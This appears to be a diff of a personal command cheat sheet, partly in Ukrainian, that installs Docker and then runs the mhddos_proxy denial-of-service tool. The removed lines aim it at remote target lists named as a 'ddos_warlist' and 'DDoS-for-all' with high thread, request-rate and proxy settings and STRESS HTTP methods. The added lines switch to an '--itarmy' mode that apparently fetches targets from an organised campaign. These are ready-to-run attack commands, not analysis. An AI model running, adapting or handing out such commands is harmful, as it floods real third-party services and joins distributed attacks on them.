@@ -1,3 +1,8 @@
+mint
+
+sudo docker ps --all   -> container_id
+sudo docker restart <container_id>
+
 sudo apt update
 sudo apt install apt-transport-https ca-certificates curl software-properties-common та нажимаємо Y
 curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
@@ -5,13 +10,7 @@ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubun
 sudo apt update
 apt-cache policy docker-ce
 sudo apt install docker-ce
-     
-sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_80.lst -t 2000 --rpc 1000 -p 350 --debug
-sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_443.lst -t 2000 --rpc 1000 -p 350 --debug
-sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_other.lst -t 2000 --rpc 1000 -p 350 --debug
 
-not work
-sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/targets/targets.txt -t 2000 --table --http-methods GET POST STRESS
-sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l7_443.lst -t 2000 --http-methods STRESS GET --rpc 1000 -p 350 --debug
-sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l7_80.lst -t 2000 --http-methods STRESS GET--rpc 1000 -p 350 --debug
- 
+
+sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --itarmy --debug
+sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --itarmy --table
